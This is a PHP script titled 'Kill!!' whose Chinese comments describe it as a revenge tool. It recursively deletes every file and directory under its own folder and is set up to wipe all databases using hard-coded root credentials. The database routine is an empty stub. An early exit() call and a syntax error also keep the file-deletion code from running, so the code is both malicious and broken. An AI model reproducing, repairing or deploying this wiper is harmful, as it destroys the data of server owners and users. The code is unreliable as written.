<?php
// +----------------------------------------------------------------------
// | Kill!!
// | 程序将清除本目录所有文件、目录
// | 如果设置了数据库信息，则尝试删除所有数据库和表数据（前提是权限要够！）
// +----------------------------------------------------------------------
// | Version: $Id$
// +---------------------------------------------------------------------- 
 
//----------数据库配置区域-----------------
//复仇的力量是很可怕的，所以无需指定数据库，全删！
define('DB_USER', 'root');
define('DB_PWD', 'root');
define('DB_HOST', 'localhost');
define('DB_PORT', '3216');
define('DB_DAMAGE', true);  //为false时，不碰数据库
 
run();
 
/**
 * 主体思想必须光辉伟大！
 *
 * @return void
 **/
function run()
{
    //删除文件
    deletedir();
    //删除数据库
    deleteDB();
}
 
/**
 * 呵呵呵，删除当前目录所有文件（递归）
 *
 * @return void
 **/
function deletedir($dir = ''){
    if ($dir == '') {
        $dir = realpath('.');
    }
    echo $dir;
    exit();
      if(!handle=@opendir($dir)){     //检测要打开目录是否存在
        die("没有该目录");
      }
      while(false !==($file=readdir($handle))){
               if($file!=="."&&$file!==".."){       //排除当前目录与父级目录
                $file=$dir .DIRECTORY_SEPARATOR. $file;
                if(is_dir($file)){
                    deletedir($file);
                }else{
                    if(@unlink($file)){
                        echo "文件<b>$file</b>删除成功。<br>";
                    }else{
                        echo  "文件<b>$file</b>删除失败!<br>";
                    }
                }
               }
               if(@rmdir($dir)){
                echo "目录<b>$dir</b>删除成功了。<br>\n";
               }else{
                echo "目录<b>$dir</b>删除失败！<br>\n";
               }
           }
 
/**
 * 呵呵呵，删除数据库
 *
 * @return void
 **/
function deleteDB()
{
    if(DB_DAMAGE === true){
        //start
    }
}